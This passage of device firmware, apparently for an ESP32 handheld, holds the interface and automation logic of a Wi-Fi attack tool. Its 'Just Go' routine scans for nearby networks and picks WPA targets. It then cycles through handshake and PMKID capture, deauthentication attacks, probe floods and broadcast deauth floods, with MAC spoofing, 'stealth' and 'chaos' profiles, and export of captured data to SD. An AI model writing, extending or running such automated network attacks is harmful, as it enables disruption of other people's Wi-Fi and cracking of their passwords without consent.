    char hud[128];
    snprintf(hud, sizeof(hud), "mode:%s  sniff:ON  pps:%d  pkts:%lu  up:%lus", autoModeStr(autoMode),
             sniffPps, (unsigned long)sniffPacketCount, (unsigned long)up);
    tft.drawString(hud, 16, hudY + 20);

    if (autoMode == AutoMode::JAMMIT) {
      snprintf(hud, sizeof(hud), "lock:%s ch:%d jam:%u",
               lockChannel ? "ON" : "OFF",
               hasTarget ? target.channel : -1,
               (unsigned)jammitLastScore);
    } else {
      snprintf(hud, sizeof(hud), "lock: %s  ch:%d",
               lockChannel ? "ON" : "OFF",
               hasTarget ? target.channel : -1);
    }
    tft.drawString(hud, 16, hudY + 34);
  } else {
    tft.drawString("sniff: OFF", 16, hudY + 20);
    char hud2[96];
    snprintf(hud2, sizeof(hud2), "lock: %s", lockChannel ? "ON" : "OFF");
    tft.drawString(hud2, 16, hudY + 34);
  }

  if (!compact) {
    // Vibe label in upper-right
    tft.setTextDatum(TR_DATUM);
    tft.setTextSize(1);
    tft.setTextColor(TFT_MAGENTA, TFT_BLACK);
    tft.drawString("NEON OPS // chillwave mode", w - 6, 10);
  }

  drawBorder();
}

static void drawAutomateMenu() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("Attacks");
  drawUniversalBackground();

  const int w = tft.width();
  const int h = tft.height();
  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();

  // Back button (bottom bar)
  btnAutoBack = {bottom.x, bottom.y, 92, UI_BUTTON_H, "Back"};
  drawButton(btnAutoBack, TFT_NAVY, TFT_CYAN, TFT_WHITE);

  // Target info
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  if (hasTarget) {
    tft.drawString(String("Target: ") + target.ssid, content.x + 4, content.y + 2);
  } else {
    tft.drawString("Target: (none)", content.x + 4, content.y + 2);
  }

  // Direct mode buttons: keep below the global top-button shift threshold,
  // and ensure 2x2 grid fits fully above bottom bar.
  const int pad = 10;
  const int gapX = 10;
  const int gapY = 8;
  const int minTop = UI_TOP_BUTTON_SHIFT_THRESHOLD_Y + 1;
  const int top = max(content.y + 16, minTop);
  const int bw = (w - (pad * 2) - gapX) / 2;
  const int maxGridH = (bottom.y - 26) - top;  // reserve space for "Active" row
  const int bh = clampi((maxGridH - gapY) / 2, 34, 46);

  btnAutoY0INK  = {pad,          top,              bw, bh, "Y0INK"};
  btnAutoRAW    = {pad + bw + gapX, top,           bw, bh, "RAW"};
  btnAutoSCOPE  = {pad,          top + bh + gapY,  bw, bh, "SCOPE"};
  btnAutoJAMMIT = {pad + bw + gapX, top + bh + gapY, bw, bh, "JAMMIT"};

  drawButton(btnAutoY0INK,  autoMode == AutoMode::Y0INK  ? TFT_DARKGREEN : TFT_DARKCYAN,  TFT_MAGENTA, TFT_WHITE);
  drawButton(btnAutoRAW,    autoMode == AutoMode::RAW    ? TFT_DARKGREEN : TFT_NAVY,      TFT_CYAN,    TFT_WHITE);
  drawButton(btnAutoSCOPE,  autoMode == AutoMode::SCOPE  ? TFT_DARKGREEN : TFT_MAROON,    TFT_CYAN,    TFT_WHITE);
  drawButton(btnAutoJAMMIT, autoMode == AutoMode::JAMMIT ? TFT_DARKGREEN : TFT_DARKGREY,  TFT_MAGENTA, TFT_WHITE);

  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  const int activeY = top + (bh * 2) + gapY + 4;
  tft.drawString("Active:", 10, activeY);
  tft.drawString(autoModeStr(autoMode), 58, activeY);

  // Footer hints
  tft.setTextDatum(BC_DATUM);
  tft.setTextSize(1);
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.drawString("Tap mode button to apply", w / 2, bottom.y - 2);

  uiLogLayout("drawAutomateMenu", content, bottom);
  uiLogButtonRect("Automate.Back", btnAutoBack);
  drawBorder();
}

// Forward declaration for shared monitor console logging.
static void monitorPushLine(uint16_t color, const char* fmt, ...);

static void justGoLogf(const char* fmt, ...) {
  char buf[32];
  va_list args;
  va_start(args, fmt);
  vsnprintf(buf, sizeof(buf), fmt, args);
  va_end(args);

  strncpy(justGoStatusLine, buf, sizeof(justGoStatusLine) - 1);
  justGoStatusLine[sizeof(justGoStatusLine) - 1] = '\0';
  monitorPushLine(TFT_CYAN, "%s", buf);
  pushConsoleEvent("INFO", "JUSTGO", buf);
  
  // Serial logging for debugging transparency
  Serial.printf("[JUSTGO] %s\n", buf);
}

static void justGoResetTargets() {
  justGoTargetCount = 0;
  justGoTargetPos = 0;
}

static bool justGoAcceptsTarget(const ApRecord& a) {
  if (a.bssid.length() < 11) return false;
  if (justGoWpaOnly) {
    if (a.auth == WIFI_AUTH_OPEN || a.auth == WIFI_AUTH_WEP) return false;
  }
  return true;
}

static void justGoBuildTargetList() {
  justGoResetTargets();
  for (int i = 0; i < apCount && justGoTargetCount < 3; i++) {
    if (!justGoAcceptsTarget(aps[i])) continue;
    justGoTargets[justGoTargetCount++] = (uint8_t)i;
    
    // THREAT ASSESSMENT: Calculate for each discovered target
    // Estimate client count based on deauth patterns (stub - use 2 as default)
    recordThreatAssessment(aps[i], 2);
  }
}

static uint32_t justGoModeDurationMs(AutoMode mode) {
  if (justGoSprayPray) {
    return 20000U; // quick cycling
  }
  // Duration varies by profile and mode
  switch (mode) {
    case AutoMode::PROBE_FLOOD: return 30000U;
    case AutoMode::Y0INK:       return 90000U;
    case AutoMode::JAMMIT:      return 45000U;
    case AutoMode::RAW:         return 45000U;
    case AutoMode::DEAUTH_FLOOD: return 45000U;
    default: return 25000U;
  }
}

static uint8_t justGoSequenceLength(const ApRecord& a) {
  if (justGoSprayPray) return 3;
  
  // Profile-specific sequence lengths
  switch (justGoProfile) {
    case JustGoProfile::STEALTH:
      // STEALTH: Y0INK only (passive)
      return 1;
    
    case JustGoProfile::PROBE_FIRST:
      // PROBE_FIRST: PROBE + base sequence
      if (a.auth == WIFI_AUTH_OPEN || a.auth == WIFI_AUTH_WEP) return 2; // PROBE + RAW
      return 4; // PROBE + Y0INK + JAMMIT + RAW
    
    case JustGoProfile::CHAOS:
      // CHAOS: DEAUTH_FLOOD + RAW
      return 2;
    
    default: // STANDARD
      if (a.auth == WIFI_AUTH_OPEN || a.auth == WIFI_AUTH_WEP) return 1; // RAW only
      return 3; // Y0INK + JAMMIT + RAW
  }
}

static AutoMode justGoModeForStep(const ApRecord& a, uint8_t step) {
  if (justGoSprayPray) {
    if (step == 0) return AutoMode::Y0INK;
    if (step == 1) return AutoMode::JAMMIT;
    return AutoMode::RAW;
  }
  
  // Profile-specific mode sequences
  switch (justGoProfile) {
    case JustGoProfile::STEALTH:
      // STEALTH: Y0INK only (passive handshake capture, no deauth)
      if (step == 0) return AutoMode::Y0INK;
      return AutoMode::NONE;
    
    case JustGoProfile::PROBE_FIRST:
      // PROBE_FIRST: Probe first to wake clients, then attack
      if (step == 0) return AutoMode::PROBE_FLOOD;
      if (a.auth == WIFI_AUTH_OPEN || a.auth == WIFI_AUTH_WEP) {
        // For open: PROBE + RAW
        if (step == 1) return AutoMode::RAW;
      } else {
        // For WPA/WPA2: PROBE + Y0INK + JAMMIT + RAW
        if (step == 1) return AutoMode::Y0INK;
        if (step == 2) return AutoMode::JAMMIT;
        if (step == 3) return AutoMode::RAW;
      }
      return AutoMode::NONE;
    
    case JustGoProfile::CHAOS:
      // CHAOS: Broadcast deauth flood + passive sniff
      if (step == 0) return AutoMode::DEAUTH_FLOOD;
      if (step == 1) return AutoMode::RAW;
      return AutoMode::NONE;
    
    default: // STANDARD
      // STANDARD: Adaptive to auth type
      if (a.auth == WIFI_AUTH_OPEN || a.auth == WIFI_AUTH_WEP) {
        // For open/WEP: RAW only
        if (step == 0) return AutoMode::RAW;
      } else {
        // For WPA/WPA2: Y0INK + JAMMIT + RAW
        if (step == 0) return AutoMode::Y0INK;
        if (step == 1) return AutoMode::JAMMIT;
        if (step == 2) return AutoMode::RAW;
      }
      return AutoMode::NONE;
  }
}

static void justGoStop() {
  justGoActive = false;
  justGoStage = JustGoStage::IDLE;
  justGoMode = AutoMode::NONE;
  justGoModeStep = 0;
  disengageAutoMode();
  if (sniffActive) stopSniff();
  
  // Summary on stop
  justGoLogf("~~ STOPPED ~~");
  uint32_t elapsed = (millis() - justGoStageStartMs) / 1000;
  justGoLogf("Ran for %lus", elapsed);
  Serial.printf("[JUSTGO-STOP] elapsed=%lu\n", elapsed);
  
  // THREAT EXPORT: Save JSON data for Android app analysis
  exportThreatDataToSD();
  
  // MAC SPOOF EXPORT: Save discovered/spoofed MACs to SD for Android analysis
  exportMacPoolToSD();
}

static void justGoStart() {
  justGoActive = true;
  justGoStage = JustGoStage::SCAN;
  justGoStageStartMs = millis();
  justGoMode = AutoMode::NONE;
  justGoModeStep = 0;
  justGoResetTargets();
  monitorLineCount = 0;
  
  // Ensure spoofing mode matches profile
  updateSpoofModeFromProfile();
  activeSpoofMode = justGoSpoofMode;
  loadMacPoolFromSD();  // Load any previously discovered MACs
  
  // Enhanced startup message
  justGoLogf("=== JUST GO ===");
  justGoLogf("Starting automation...");
  char startMsg[128];
  snprintf(startMsg, sizeof(startMsg), "Profile:%s|Spoof:%s|Spray:%s",
           profileNames[(uint8_t)justGoProfile],
           spoofModeNames[(uint8_t)activeSpoofMode],
           justGoSprayPray ? "ON" : "OFF");
  justGoLogf(startMsg);
  Serial.printf("[JUSTGO-START] profile=%s spoof=%s spray=%d\n",
                profileNames[(uint8_t)justGoProfile],
                spoofModeNames[(uint8_t)activeSpoofMode],
                justGoSprayPray ? 1 : 0);
}

static void justGoPickTarget(uint32_t now) {
  if (justGoTargetCount == 0) {
    justGoStage = JustGoStage::SCAN;
    justGoStageStartMs = now;
    justGoLogf("JustGo: no targets; rescanning");
    return;
  }

  if (justGoTargetPos >= justGoTargetCount) justGoTargetPos = 0;
  const ApRecord& a = aps[justGoTargets[justGoTargetPos]];
  target = a;
  hasTarget = true;
  lockChannel = true;
  justGoTargetStartMs = now;
  justGoModeStep = 0;
  justGoMode = AutoMode::NONE;
  justGoStage = JustGoStage::RUN_MODE;
  justGoStageStartMs = now;
  
  // Enhanced target info logging
  char authStr[16] = "?";
  switch(a.auth) {
    case WIFI_AUTH_OPEN: strcpy(authStr, "OPEN"); break;
    case WIFI_AUTH_WEP: strcpy(authStr, "WEP"); break;
    case WIFI_AUTH_WPA_PSK: strcpy(authStr, "WPA"); break;
    case WIFI_AUTH_WPA2_PSK: strcpy(authStr, "WPA2"); break;
    case WIFI_AUTH_WPA_WPA2_PSK: strcpy(authStr, "WPA/WPA2"); break;
    case WIFI_AUTH_WPA3_PSK: strcpy(authStr, "WPA3"); break;
    default: strcpy(authStr, "OTHER"); break;
  }
  justGoLogf(">>> TARGET: %s", a.ssid.c_str());
  justGoLogf("Auth:%s|Ch:%u|RSSI:%d", authStr, (unsigned)a.channel, a.rssi);
  Serial.printf("[JUSTGO-TARGET] ssid=%s bssid=%s auth=%s ch=%u rssi=%d\n",
                a.ssid.c_str(), a.bssid.c_str(), authStr, a.channel, a.rssi);
}

static void justGoAdvanceTarget(uint32_t now) {
  disengageAutoMode();
  justGoMode = AutoMode::NONE;
  justGoModeStep = 0;
  justGoTargetPos++;
  justGoStage = JustGoStage::SELECT_TARGET;
  justGoStageStartMs = now;
}

// Event-driven console update: only logs on state changes
static void justGoUpdateConsole() {
  if (!justGoActive) return;

  const uint32_t now = millis();
  
  // Check if mode changed
  if (justGoMode != justGoLastMode) {
    justGoLastMode = justGoMode;
    if (justGoMode != AutoMode::NONE && hasTarget) {
      uint32_t durationSec = justGoModeDurationMs(justGoMode) / 1000;
      const char* modeDesc = "?";
      if (justGoMode == AutoMode::Y0INK) {
        modeDesc = "Hunting handshakes...";
      } else if (justGoMode == AutoMode::JAMMIT) {
        modeDesc = "Launching deauth attack...";
      } else if (justGoMode == AutoMode::RAW) {
        modeDesc = "Passive packet capture...";
      } else if (justGoMode == AutoMode::PROBE_FLOOD) {
        modeDesc = "Waking clients with probes...";
      } else if (justGoMode == AutoMode::DEAUTH_FLOOD) {
        modeDesc = "Broadcast channel deauth...";
      }
      justGoLogf("[%s] %s (%lus)", autoModeStr(justGoMode), modeDesc, durationSec);
    }
  }
  
  // Check if stage changed to COOLDOWN
  if (justGoStage == JustGoStage::COOLDOWN && justGoLastStage != JustGoStage::COOLDOWN) {
    justGoLogf("=== COOLDOWN ===");
    justGoLogf("Preparing next target...");
    Serial.printf("[JUSTGO-COOLDOWN] next_target_preparing\n");
  }
  
  justGoLastStage = justGoStage;
}

static void justGoTick() {
  if (!justGoActive) return;

  const uint32_t now = millis();
  
  // Update console telemetry periodically
  justGoUpdateConsole();
  
  switch (justGoStage) {
    case JustGoStage::SCAN:
      justGoLogf(">>> SCANNING...");
      doWifiScanBlocking();
      sortApsByRssiDesc();
      dedupeKeepStrongest();
      justGoBuildTargetList();
      if (justGoTargetCount > 0) {
        justGoLogf("Found %u targets", justGoTargetCount);
        Serial.printf("[JUSTGO-SCAN] targets_found=%u\n", justGoTargetCount);
      } else {
        justGoLogf("No targets, retry...");
      }
      justGoStage = JustGoStage::SELECT_TARGET;
      justGoStageStartMs = now;
      break;

    case JustGoStage::SELECT_TARGET:
      if (justGoTargetCount == 0) {
        if (now - justGoStageStartMs > 15000U) {
          justGoLogf("No targets found, rescanning...");
          justGoStage = JustGoStage::SCAN;
          justGoStageStartMs = now;
        }
        break;
      }
      justGoPickTarget(now);
      break;

    case JustGoStage::RUN_MODE: {
      if (justGoAutoHop) {
        uint32_t stayMs = (uint32_t)justGoStayMinutes * 60000U;
        if (stayMs > 0 && (now - justGoTargetStartMs) >= stayMs) {
          justGoAdvanceTarget(now);
          break;
        }
      }

      if (!hasTarget) {
        justGoStage = JustGoStage::SCAN;
        justGoStageStartMs = now;
        break;
      }

      const ApRecord& a = target;
      const uint8_t seqLen = justGoSequenceLength(a);
      if (justGoModeStep >= seqLen) {
        justGoStage = JustGoStage::COOLDOWN;
        justGoStageStartMs = now;
        break;
      }

      if (justGoMode == AutoMode::NONE) {
        justGoMode = justGoModeForStep(a, justGoModeStep);
        justGoStageStartMs = now;
        engageAutoMode(justGoMode);
        
        // Detailed mode engagement messages
        const char* modeDesc = "?";
        if (justGoMode == AutoMode::Y0INK) {
          modeDesc = "Hunting handshakes...";
        } else if (justGoMode == AutoMode::JAMMIT) {
          modeDesc = "Launching deauth attack...";
        } else if (justGoMode == AutoMode::RAW) {
          modeDesc = "Passive packet capture...";
        } else if (justGoMode == AutoMode::PROBE_FLOOD) {
          modeDesc = "Waking clients with probes...";
        } else if (justGoMode == AutoMode::DEAUTH_FLOOD) {
          modeDesc = "Broadcast channel deauth...";
        }
        justGoLogf("[%s]  %s", autoModeStr(justGoMode), modeDesc);
        Serial.printf("[JUSTGO-ENGAGE] mode=%s desc=%s\n", autoModeStr(justGoMode), modeDesc);
        break;
      }

      if (justGoMode == AutoMode::Y0INK) {
        if (YoinkEngine::getHandshakeCount() > 0 || YoinkEngine::getPmkidCount() > 0) {
          uint8_t hs = YoinkEngine::getHandshakeCount();
          uint8_t pmkid = YoinkEngine::getPmkidCount();
          justGoLogf("[SUCCESS] %dHS + %dPMKID", hs, pmkid);
          justGoLogf("Y0INK complete - advancing...");
          Serial.printf("[JUSTGO-CAPTURE] handshakes=%d pmkids=%d\n", hs, pmkid);
          disengageAutoMode();
          justGoMode = AutoMode::NONE;
          justGoModeStep++;
          justGoStageStartMs = now;
          break;
        }
      }

      const uint32_t maxMs = justGoModeDurationMs(justGoMode);
      if ((now - justGoStageStartMs) >= maxMs) {
        // Log summary before advancing
        if (justGoMode == AutoMode::Y0INK) {
          uint8_t clients = YoinkEngine::getClientCount();
          uint8_t hs = YoinkEngine::getHandshakeCount();
          justGoLogf("Y0INK timeout - found %dC/%dHS", clients, hs);
        } else if (justGoMode == AutoMode::JAMMIT) {
          justGoLogf("JAMMIT complete - %lu deauths", (unsigned long)jammitDeauthCount);
        } else if (justGoMode == AutoMode::RAW) {
          justGoLogf("RAW complete - sniff done");
        } else if (justGoMode == AutoMode::PROBE_FLOOD) {
          justGoLogf("PROBE_FLOOD complete - clients probed");
        } else if (justGoMode == AutoMode::DEAUTH_FLOOD) {
          justGoLogf("DEAUTH_FLOOD complete - broadcast done");
        }
        disengageAutoMode();
        justGoMode = AutoMode::NONE;
        justGoModeStep++;
        justGoStageStartMs = now;
      }
      break;
    }

    case JustGoStage::COOLDOWN:
      if (now - justGoStageStartMs >= 3000U) {
        if (justGoAutoHop) {
          uint32_t elapsed = now - justGoTargetStartMs;
          justGoLogf("[TARGET DONE] %lus elapsed", elapsed / 1000);
          justGoAdvanceTarget(now);
        } else {
          justGoMode = AutoMode::NONE;
          justGoModeStep = 0;
          justGoStage = JustGoStage::RUN_MODE;
          justGoStageStartMs = now;
        }
      }
      break;

    default:
      break;
  }
}

static void drawJustGo() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("Just Go");
  drawUniversalBackground();

  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();
  const bool compact = (tft.height() <= 180);
  const int panelX = content.x;
  const int panelY = compact ? 30 : 34;
  const int panelRightLimit = hypercubeBoxX - (compact ? 8 : 10); // keep clear from hypercube
  const int panelW = max(compact ? 132 : 120, panelRightLimit - panelX);
  const int panelH = compact ? 24 : 28;
  tft.drawRoundRect(panelX, panelY, panelW, panelH, 5, TFT_DARKGREY);
  tft.fillRoundRect(panelX + 1, panelY + 1, panelW - 2, panelH - 2, 5, TFT_BLACK);
  const char* stageStr = "IDLE";
  switch (justGoStage) {
    case JustGoStage::SCAN:          stageStr = "SCAN"; break;
    case JustGoStage::SELECT_TARGET: stageStr = "SELECT"; break;
    case JustGoStage::RUN_MODE:      stageStr = "RUN"; break;
    case JustGoStage::COOLDOWN:      stageStr = "COOLDOWN"; break;
    default:                         stageStr = "IDLE"; break;
  }
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  // Row 1: RUNNING/IDLE | Stage
  tft.setTextColor(justGoActive ? TFT_GREEN : TFT_DARKGREY, TFT_BLACK);
  tft.drawString(justGoActive ? "RUNNING" : "IDLE", panelX + 5, panelY + 3);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString(String("Stage: ") + stageStr, panelX + (compact ? 64 : 70), panelY + 3);
  // Row 2: Status info
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  String statusLine = justGoStatusLine;
  while (statusLine.length() > 4 && tft.textWidth(statusLine) > (panelW - 10)) {
    statusLine.remove(statusLine.length() - 1);
  }
  tft.drawString(statusLine, panelX + 5, panelY + (compact ? 13 : 14));

  // Stay minutes controls relocated under the hypercube.
  const int stayTextY = compact ? (panelY + panelH + 2) : (hypercubeBoxY + hypercubeBoxH + 10);
  const int stayY = stayTextY + (compact ? 8 : 10);
  const int stayBtnW = compact ? 30 : 34;
  const int stayBtnH = compact ? 20 : 24;
  const int stayGap = compact ? 4 : 6;
  const int stayX = hypercubeBoxX + ((hypercubeBoxW - ((stayBtnW * 2) + stayGap)) / 2);
  btnJustGoStayMinus = {stayX, stayY, stayBtnW, stayBtnH, "-"};
  btnJustGoStayPlus = {stayX + stayBtnW + stayGap, stayY, stayBtnW, stayBtnH, "+"};
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  char stayBuf[36];
  snprintf(stayBuf, sizeof(stayBuf), "Stay:%umin", (unsigned)justGoStayMinutes);
  tft.drawString(stayBuf, stayX, stayTextY);
  drawButton(btnJustGoStayMinus, TFT_BLACK, TFT_MAGENTA, TFT_WHITE);
  drawButton(btnJustGoStayPlus, TFT_BLACK, TFT_MAGENTA, TFT_WHITE);

  // Larger live console.
  const int consoleX = panelX;
  const int consoleW = panelW;  // align exactly with status box width
  const int profileStripH = compact ? 18 : 28;
  const int profileY = bottom.y - profileStripH - 2;
  const int consoleY = panelY + panelH + (compact ? 4 : 10);
  const int consoleBottom = profileY - 4;
  const int consoleH = max(compact ? 34 : 24, consoleBottom - consoleY);
  tft.drawRect(consoleX, consoleY, consoleW, consoleH, TFT_CYAN);
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("LIVE CONSOLE", consoleX + 6, consoleY + 4);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  const int lineStep = compact ? 9 : 10;
  int lineY = consoleY + (compact ? 14 : 16);
  int maxLines = (consoleH - (compact ? 14 : 18)) / lineStep;
  if (maxLines < 1) maxLines = 1;
  int startIdx = 0;
  if (monitorLineCount > maxLines) startIdx = monitorLineCount - maxLines;
  for (int i = startIdx; i < monitorLineCount; i++) {
    tft.setTextColor(monitorLines[i].color, TFT_BLACK);
    tft.drawString(monitorLines[i].text, consoleX + 6, lineY);
    lineY += lineStep;
    if (lineY > (consoleY + consoleH - 10)) break;
  }

  // Bottom control bar: profile selector strip above primary controls.
  tft.fillRect(bottom.x, profileY, bottom.w, profileStripH, TFT_BLACK);
  tft.drawRect(bottom.x + 1, profileY, bottom.w - 2, profileStripH, TFT_DARKGREY);
  
  // Profile selector buttons: < [PROFILE_NAME] >
  const int profBtnW = compact ? 36 : 40;
  const int profBtnH = compact ? 16 : 20;
  const int profY = profileY + (compact ? 1 : 2);
  const int profCenterX = bottom.x + (bottom.w / 2);  // Center of the box
  
  btnJustGoProfilePrev = {bottom.x + 8, profY, profBtnW, profBtnH, "<"};
  btnJustGoProfileNext = {bottom.x + bottom.w - profBtnW - 8, profY, profBtnW, profBtnH, ">"};
  
  // Center profile label and name in the middle area
  tft.setTextDatum(TC_DATUM);
  tft.setTextSize(1);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.drawString("Profile:", profCenterX - 50, profileY + 1);
  tft.setTextColor(justGoActive ? TFT_GREEN : TFT_CYAN, TFT_BLACK);
  tft.drawString(profileNames[(int)justGoProfile], profCenterX + 20, profileY + 1);
  
  drawButton(btnJustGoProfilePrev, TFT_DARKGREY, TFT_CYAN, TFT_WHITE);
  drawButton(btnJustGoProfileNext, TFT_DARKGREY, TFT_CYAN, TFT_WHITE);

  // Bottom control bar: Back | Spray+Pray | GO/STOP
  tft.fillRect(bottom.x, bottom.y, bottom.w, bottom.h, TFT_BLACK);
  const int gap = compact ? 4 : 6;
  const int sideW = compact ? 66 : 72;
  const int midW = bottom.w - (sideW * 2) - (gap * 2);
  btnJustGoBack = {bottom.x, bottom.y, sideW, UI_BUTTON_H, "Back"};
  btnJustGoSpray = {bottom.x + sideW + gap, bottom.y, midW, UI_BUTTON_H, "Spray+Pray"};
  btnJustGoToggle = {bottom.x + sideW + gap + midW + gap, bottom.y, sideW, UI_BUTTON_H, justGoActive ? "STOP" : "GO"};
  drawButton(btnJustGoBack, TFT_NAVY, TFT_CYAN, TFT_WHITE);
  drawButton(btnJustGoSpray, justGoSprayPray ? TFT_DARKGREEN : TFT_DARKGREY, TFT_MAGENTA, TFT_WHITE);
  drawButton(btnJustGoToggle, justGoActive ? TFT_MAROON : TFT_DARKGREEN, TFT_MAGENTA, TFT_WHITE);

  drawBorder();
}

static uint16_t scopeWaterfallColor(uint8_t level) {
  if (level >= 90) return TFT_RED;
  if (level >= 75) return TFT_ORANGE;
  if (level >= 60) return TFT_YELLOW;
  if (level >= 45) return TFT_GREEN;
  if (level >= 25) return TFT_CYAN;
  if (level > 0) return TFT_NAVY;
  return TFT_BLACK;
}

static void scopeResetWaterfall() {
  memset(scopeWaterfall, 0, sizeof(scopeWaterfall));
  scopeWaterfallRows = 0;
}

static void scopePushWaterfallFrame() {
  int chIntensity[SCOPE_CH_COUNT] = {0};
  int maxIntensity = 1;
  for (int i = 0; i < apCount; i++) {
    int ch = aps[i].channel;
    if (ch < 1 || ch > SCOPE_CH_COUNT) continue;
    int weight = clampi(aps[i].rssi, -100, -30) + 100;  // stronger AP contributes more
    chIntensity[ch - 1] += weight;
    if (chIntensity[ch - 1] > maxIntensity) maxIntensity = chIntensity[ch - 1];
  }

  for (int ch = 0; ch < SCOPE_CH_COUNT; ch++) {
    for (int row = SCOPE_WATERFALL_MAX_ROWS - 1; row > 0; row--) {
      scopeWaterfall[ch][row] = scopeWaterfall[ch][row - 1];
    }
    scopeWaterfall[ch][0] = (uint8_t)((chIntensity[ch] * 100) / maxIntensity);
  }
  if (scopeWaterfallRows < SCOPE_WATERFALL_MAX_ROWS) {
    scopeWaterfallRows++;
  }
}

static void drawScopeGraph() {
  const int w = tft.width();
  const int h = tft.height();
  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();
  const int panelY = content.y + 46;
  const int panelH = bottom.y - panelY - 8;
  const int leftX = 8;
  const int leftW = 154;
  const int rightX = 166;
  const int rightW = w - rightX - 8;

  btnScopeBack = {bottom.x, bottom.y, 92, UI_BUTTON_H, "Back"};
  btnScopeRefresh = {bottom.x + 98, bottom.y, 92, UI_BUTTON_H, "Refresh"};

  if (!scopeLayoutDrawn) {
    scopeMetaDrawnSig = 0;
    for (int i = 0; i < 5; i++) {
      scopeApDrawnSig[i] = 0;
    }

    tft.fillScreen(TFT_BLACK);
    drawHeader("SCOPE");
    drawUniversalBackground();
    drawButton(btnScopeBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);
    drawButton(btnScopeRefresh, TFT_DARKCYAN, TFT_CYAN, TFT_WHITE);

    tft.setTextDatum(TL_DATUM);
    tft.setTextSize(1);
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.drawString("WiFi AP Strength + Channel Waterfall", content.x + 2, content.y + 18);

    tft.drawRect(leftX, panelY, leftW, panelH, TFT_DARKGREY);
    tft.drawRect(rightX, panelY, rightW, panelH, TFT_DARKGREY);

    // Static row/bar outlines for partial redraw updates.
    const int apRows = 5;
    const int apRowH = (panelH - 20) / apRows;
    for (int i = 0; i < apRows; i++) {
      int y = panelY + 18 + (i * apRowH);
      int barX = leftX + 66;
      int barY = y + 3;
      int barH = apRowH - 7;
      tft.drawRect(barX, barY, leftW - 72, barH, TFT_DARKGREY);
    }

    const int wfTopY = panelY + 20;
    const int wfBottomY = panelY + panelH - 14;
    const int wfH = wfBottomY - wfTopY;
    tft.drawRect(rightX + 2, wfTopY, rightW - 4, wfH, TFT_DARKGREY);
    drawBorder();
    scopeLayoutDrawn = true;
  } else {
    // Keep button visuals current without redrawing the full screen.
    drawButton(btnScopeBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);
    drawButton(btnScopeRefresh, TFT_DARKCYAN, TFT_CYAN, TFT_WHITE);
  }

  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  char meta[72];
  if (wifiIsScanning) {
    snprintf(meta, sizeof(meta), "Scanning...");
  } else {
    uint32_t age = (millis() - scopeLastScanMs) / 1000;
    snprintf(meta, sizeof(meta), "APs:%d   Last scan:%lus ago", apCount, (unsigned long)age);
  }
  const uint32_t metaSig = hashText(meta);
  if (metaSig != scopeMetaDrawnSig) {
    tft.fillRect(content.x + 2, content.y + 30, w - 20, 12, TFT_BLACK);
    tft.setTextColor(wifiIsScanning ? TFT_YELLOW : TFT_GREEN, TFT_BLACK);
    tft.drawString(meta, content.x + 2, content.y + 30);
    scopeMetaDrawnSig = metaSig;
  }

  tft.setTextColor(TFT_MAGENTA, TFT_BLACK);
  tft.drawString("Top AP RSSI", leftX + 6, panelY + 4);
  tft.drawString("Ch Waterfall", rightX + 6, panelY + 4);

  // LEFT: strongest AP bars
  const int apRows = 5;
  const int apRowH = (panelH - 20) / apRows;
  for (int i = 0; i < apRows; i++) {
    int y = panelY + 18 + (i * apRowH);
    int barX = leftX + 66;
    int barY = y + 3;
    int barH = apRowH - 7;
    int rowW = leftW - 4;

    char name[14];
    int rssi = -127;
    int barW = 0;
    if (i >= apCount) {
      snprintf(name, sizeof(name), "--");
    } else {
      const ApRecord& ap = aps[i];
      int clamped = clampi(ap.rssi, -100, -30);
      int level = clamped + 100; // 0..70
      barW = (level * (leftW - 72)) / 70;
      rssi = ap.rssi;
      snprintf(name, sizeof(name), "%.10s", ap.ssid.c_str());
    }

    uint32_t rowSig = hashText(name);
    rowSig ^= (uint32_t)(uint16_t)(rssi + 256) << 16;
    rowSig ^= (uint32_t)(uint16_t)barW;
    bool rowChanged = (rowSig != scopeApDrawnSig[i]);
    if (!rowChanged) continue;

    tft.fillRect(leftX + 2, y + 1, rowW, apRowH - 2, TFT_BLACK);
    tft.setTextColor((i >= apCount) ? TFT_DARKGREY : TFT_WHITE, TFT_BLACK);
    tft.drawString(name, leftX + 6, y + 2);

    tft.drawRect(barX, barY, leftW - 72, barH, TFT_DARKGREY);
    if (barW > 0) tft.fillRect(barX + 1, barY + 1, barW, barH - 2, TFT_CYAN);

    if (i < apCount) {
      char rssiTxt[12];
      snprintf(rssiTxt, sizeof(rssiTxt), "%ddBm", rssi);
      tft.setTextColor(TFT_YELLOW, TFT_BLACK);
      tft.drawString(rssiTxt, barX + 4, y + 2);
    }

    scopeApDrawnSig[i] = rowSig;
  }

  // RIGHT: channel waterfall heatmap (ch 1..13)
  const int wfTopY = panelY + 20;
  const int wfBottomY = panelY + panelH - 14;
  const int wfH = wfBottomY - wfTopY;
  const int wfInnerX = rightX + 4;
  const int wfInnerW = rightW - 8;
  const int colGap = 1;
  int colW = (wfInnerW - (SCOPE_CH_COUNT - 1) * colGap) / SCOPE_CH_COUNT;
  if (colW < 1) colW = 1;
  const int totalW = (colW * SCOPE_CH_COUNT) + ((SCOPE_CH_COUNT - 1) * colGap);
  const int xStart = rightX + ((rightW - totalW) / 2);

  for (int ch = 0; ch < SCOPE_CH_COUNT; ch++) {
    const int x = xStart + (ch * (colW + colGap));
